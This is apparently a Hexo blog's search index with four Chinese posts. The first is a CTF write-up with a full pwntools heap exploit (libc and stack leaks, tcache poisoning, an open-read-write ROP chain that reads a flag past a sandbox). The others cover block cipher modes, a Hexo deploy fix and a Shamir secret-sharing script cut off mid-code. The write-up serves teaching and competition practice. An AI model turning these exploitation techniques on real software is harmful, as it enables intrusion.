<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【CISCN2022】东北赛区分区赛PWN WriteUP</title>
    <link href="/2022/06/21/CISCN%202022/"/>
    <url>/2022/06/21/CISCN%202022/</url>
    
    <content type="html"><![CDATA[<h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul><li>首先根据unsorted bin 泄露出libc</li><li>然后根据libc_base 和 <code>libc.bss()</code>函数泄露栈地址</li><li>利用orw ROP覆盖ret返回地址，并绕过沙盒机制</li><li>soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input size:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">32</span>:<br>        io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>        io.send(content)<br><br><br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># io.recvline()</span><br><span class="hljs-comment"># pause()</span><br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;libc_base --&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>bss_addr = libc_base + libc.bss()<br>success(<span class="hljs-string">&#x27;bss --&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(bss_addr))<br>flag_addr = bss_addr + <span class="hljs-number">0x200</span><br><span class="hljs-comment"># edit(32,&#x27;&#x27;)</span><br><br>pop_rdi = libc_base +<span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bfa</span><span class="hljs-comment"># : pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000106791</span><span class="hljs-comment"># : pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446b0</span><span class="hljs-comment"># : pop rax ; ret</span><br>open_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>key = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(key))<br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x40</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret = stack-<span class="hljs-number">0x148</span><br>success(<span class="hljs-string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="hljs-built_in">hex</span>(stack-<span class="hljs-number">0x8</span>))<br>success(<span class="hljs-string">&#x27;ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(ret))<br><span class="hljs-comment"># free(1)</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64((ret)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((ret)^key))<br>pause()<br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdi)<br>orw += p64(ret)<br>orw += p64(pop_rsi)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(open_addr)<br><br><br><span class="hljs-comment">##read</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(read_addr)<br><br><span class="hljs-comment">##write</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(write_addr)<br>add(<span class="hljs-number">0x400</span>,orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>分组密码的五种工作模式</title>
    <link href="/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="电子密码本模式Electronic-Codebook-ECB"><a href="#电子密码本模式Electronic-Codebook-ECB" class="headerlink" title="电子密码本模式Electronic Codebook, ECB"></a>电子密码本模式Electronic Codebook, ECB</h2><blockquote><p>明文分成64的分组进行加密，必要时填充，每个分组用同一密钥加密，同样明文分组加密得相同密文</p></blockquote><h3 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry1.png" alt="ECB"></p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ul><li>ECB模式特别适合数据较少的情况，如安全传输DES密钥</li><li>一段明文消息中若有几个相同的明文组，则密文也将出现几个相同的片段</li><li>对于很长的消息，ECB是不安全的，如果消息是非常结构化的，密码分析可能利用其结构特征来破解</li><li>ECB的弱点来源于其加密过的密文分组是互相独立的</li></ul><h2 id="密文分组链接模式Cipher-Block-Chaining-CBC"><a href="#密文分组链接模式Cipher-Block-Chaining-CBC" class="headerlink" title="密文分组链接模式Cipher Block Chaining (CBC)"></a>密文分组链接模式Cipher Block Chaining (CBC)</h2><blockquote><p>加密输入是当前明文分组和前一密文分组的异或，形成一条链，使用相同的密钥， 这样每个明文分组的加密函数输入与明文分组之间不再有固定的关系</p></blockquote><h3 id="示意图-1"><a href="#示意图-1" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry2.png" alt="CBC"></p><h3 id="优点和局限"><a href="#优点和局限" class="headerlink" title="优点和局限"></a>优点和局限</h3><ul><li>每个密文分组依赖于其他明文分组 </li><li>明文消息中的任何一点变化都会影响密文分组 </li><li>发送方和接收方需要共享初始向量Initial Value(IV)<ul><li>如果IV被明文传送，则攻击者可以改变第一个分组的某些位，然后预先改变IV中的某些位，则接收者收到的P1也就相应改变了</li><li>因此，IV必须是一个固定的值或者必须用ECB方式在消息之前加密传送</li></ul></li><li>在消息的最后，还要处理不够长度的分组 <ul><li>可以填充已知非数据值，或者在最后一块补上填充位长度</li></ul></li></ul><h2 id="密码反馈模式Cipher-FeedBack-CFB"><a href="#密码反馈模式Cipher-FeedBack-CFB" class="headerlink" title="密码反馈模式Cipher FeedBack (CFB)"></a>密码反馈模式Cipher FeedBack (CFB)</h2><blockquote><ul><li>是一种将DES转化成流密码的技术，不再要求报文被填充成整个分组，可以实时运行，如果要传输一个字符流，每个字符都可以使用面向字符的流密码加密后立即传输。</li><li>加密：加密函数的输入是一个64位的移位寄存器，产生初始向量IV。加密函数高端j位与明文P1的第一单元异或，产生j位密文C1进入移位寄存器低端，继续加密，与P2输入异或，如此重复直到所有明文单元都完成加密。</li><li>解密：采用相同方案，但是使用加密函数而非解密函数</li></ul></blockquote><h3 id="示意图-2"><a href="#示意图-2" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry3.png" alt="CFB"></p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li>当数据以位或字节形式到达时使用都是适当的 </li><li>最通用的是流密码形式</li></ul><h2 id="输出反馈模式Output-FeedBack-OFB"><a href="#输出反馈模式Output-FeedBack-OFB" class="headerlink" title="输出反馈模式Output FeedBack (OFB)"></a>输出反馈模式Output FeedBack (OFB)</h2><blockquote><p>结构上类似CFB，但是OFB中加密函数输出被反馈回移位寄存器，CFB中是密文单元被反馈回移位寄存器。优点是传输中的比特差错不会传播，缺点是比CFB更容易受报文流篡改攻击。</p></blockquote><h3 id="示意图-3"><a href="#示意图-3" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry4.png" alt="OFB"></p><h3 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li>OFB的一个优点是传输过程中在某位上发生的错误不会影响到其他位。比如，C1中有1位发生了错误，只会影响到P1的恢复，后续的明文单元不受影响。</li><li>OFB的缺点是，抗消息流篡改攻击的能力不如CFB。即密文中的某位取反，恢复出的明文相应位也取反</li></ul><h2 id="计数器模式Counter-CTR"><a href="#计数器模式Counter-CTR" class="headerlink" title="计数器模式Counter (CTR)"></a>计数器模式Counter (CTR)</h2><blockquote><ul><li>是一种新模式，虽然早就提出来了</li><li>与OFB很像，但是加密的是计数器的值而不是任何反馈回来的值</li><li>每一个明文分组都必须使用一个不同的密钥和计数器值，决不要重复使用Ci &#x3D; Pi XOR Oi Oi &#x3D; DESK1(i)</li><li>可以用于高速网络加密中</li></ul></blockquote><h3 id="示意图-4"><a href="#示意图-4" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry5.png" alt="CTR"></p><h3 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li>高效<ul><li>可以做并行加密</li><li>对高速链路的突发数据加密尤其有效</li></ul></li><li>可以对被加密的分组进行随机存取</li><li>相当安全</li><li>简洁</li><li>必须决不重复使用密钥和计数器值</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo部署出现错误 Error Spawn failed 解决方式(code 128)</title>
    <link href="/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
    <url>/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一次报错处理方式，在更新了自己的必读书目之后，执行 hexo clean &amp;&amp; hexo g -d 时出现如下错误</p></blockquote><h2 id="错误信息一"><a href="#错误信息一" class="headerlink" title="错误信息一"></a>错误信息一</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>remote: No anonymous write access.<br>fatal: Authentication failed <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span><br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>一、打开vscode设置界面，搜索git.terminal Authentication，将他前面的 √ 去掉</p><p><img src="/img/article/error128/vscode1.png" alt="image-20220607164521802"></p><p>二、crtl + shift + p 打开搜索框，搜索reload window并运行</p><p><img src="/img/article/error128/vscode2.png" alt="image-20220607164739265"></p><p>三、再次尝试hexo g，解决成功</p><p><img src="/img/article/error128/vscode3.png" alt="image-20220607164850847"></p><h2 id="错误信息二"><a href="#错误信息二" class="headerlink" title="错误信息二"></a>错误信息二</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal: unable to access <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span>: gnutls_handshake() failed: Error <span class="hljs-keyword">in</span> the pull <span class="hljs-keyword">function</span>.<br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>打开_config.yml文件，更改https仓库地址为ssh地址,配置ssh密钥即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span><span class="hljs-string">https://github.com/YourName/YourName.github.io.git(不要使用这个)</span><br>  <span class="hljs-string">git@github.com:YourName/YourName.github.io.git(用这个)</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python实现shamir加密和图像加密隐写</title>
    <link href="/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/"/>
    <url>/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>网络信息安全上机作业罢了，人已经麻了</p></blockquote><h2 id="shamir秘密共享协议"><a href="#shamir秘密共享协议" class="headerlink" title="shamir秘密共享协议"></a>shamir秘密共享协议</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>假设有秘密S要保护，任意取t-1个随机数，构造如下多项式： <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[公式]"> ，其中， <img src="https://www.zhihu.com/equation?tex=a_0=S" alt="[公式]"> ，所有运算均在有有限域中进行。</p><ul><li>取任意n个数， <img src="https://www.zhihu.com/equation?tex=x_1,x_2,%5Ccdots,x_n" alt="[公式]"> 分别带入多项式，得到 <img src="https://www.zhihu.com/equation?tex=f(x_1),f(x_2),%5Ccdots+f(x_n)" alt="[公式]"> 。</li><li>将 <img src="https://www.zhihu.com/equation?tex=(x_1,f(x_1)),%5Ccdots+,(x_n,f(x_n))" alt="[公式]"> 分发给n个服务器上。</li></ul><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>从任意t个服务器上取得数据，假设取得 <img src="https://www.zhihu.com/equation?tex=(x_1,y_1),%5Ccdots+,(x_t,y_t)" alt="[公式]"> ，带入并求解多项式系数；<br><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Baligned%7D+a_0+a_1x_1+%5Ccdots+,a_%7Bt-1%7Dx_1%5E%7Bt-1%7D=y_1+%5C%5C+a_0+a_1x_2+%5Ccdots+,a_%7Bt-1%7Dx_2%5E%7Bt-1%7D=y_2+%5C%5C+%5Ccdots+%5C%5C+a_0+a_1x_t+%5Ccdots+,a_%7Bt-1%7Dx_%7Bt%7D%5E%7Bt-1%7D=y_%7Bt%7D+%5C%5C+%5Cend%7Baligned%7D" alt="[公式]"><br>用矩阵乘法表示为：<br><img src="/img/article/shamir/matrix.png" alt="img"><br>在求得 <img src="https://www.zhihu.com/equation?tex=a_0,a_1,%5Ccdots,a_%7Bt-1%7D" alt="[公式]"> 之后便可以构造出多项式 <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[公式]"></p><p>将 <img src="https://www.zhihu.com/equation?tex=x=0" alt="[公式]"> 带入到多项式中，可以求的原秘密 <img src="https://www.zhihu.com/equation?tex=S=a_0" alt="[公式]"></p><h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br><span class="hljs-keyword">from</span> decimal <span class="hljs-keyword">import</span> Decimal<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment">##测试数据</span><br><span class="hljs-built_in">max</span> = <span class="hljs-number">1000000</span><br>t = <span class="hljs-number">5</span><br>n = <span class="hljs-number">8</span><br>secret = <span class="hljs-number">31298123678</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ENCRYPTING.......&#x27;</span>)<br><span class="hljs-comment">##构造多项式f(x)</span><br>fx = [random.randrange(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t-<span class="hljs-number">1</span>)]<br>fx.append(secret)<br><br><span class="hljs-comment">##任取n个x，分别带入多项式，产生对应的(x,y)</span><br>share = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    x = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span> <br>    <span class="hljs-keyword">for</span> idx, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fx[::-<span class="hljs-number">1</span>]):<br>        y += value * x**idx<br>    share.append((x,y))         <span class="hljs-comment">##每人分到的(x,y)序列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;share:(&#x27;</span>,x,<span class="hljs-string">&#x27;,&#x27;</span>,y,<span class="hljs-string">&#x27;)&#x27;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DECRYPTING......&#x27;</span>)<br><span class="hljs-comment">##任取t个(x,y)序列,并解密</span><br>key = random.sample(share,t)<br><span class="hljs-built_in">sum</span> =<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i, key_i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    x_i,y_i = key_i<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key:(&#x27;</span>,x_i,<span class="hljs-string">&#x27;,&#x27;</span>,y_i,<span class="hljs-string">&#x27;)&#x27;</span>)<br>    temp = Decimal(<span class="hljs-number">1</span>)<br>    <br>    <span class="hljs-keyword">for</span> j, key_j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>        x_j,y_j = key_j<br>        <span class="hljs-keyword">if</span> i != j:<br>            temp *= Decimal(Decimal(x_j)/Decimal(x_j-x_i))<br>    temp *= y_i<br>    <span class="hljs-built_in">sum</span> += Decimal(temp)<br><br><span class="hljs-built_in">sum</span> = <span class="hljs-built_in">int</span>(<span 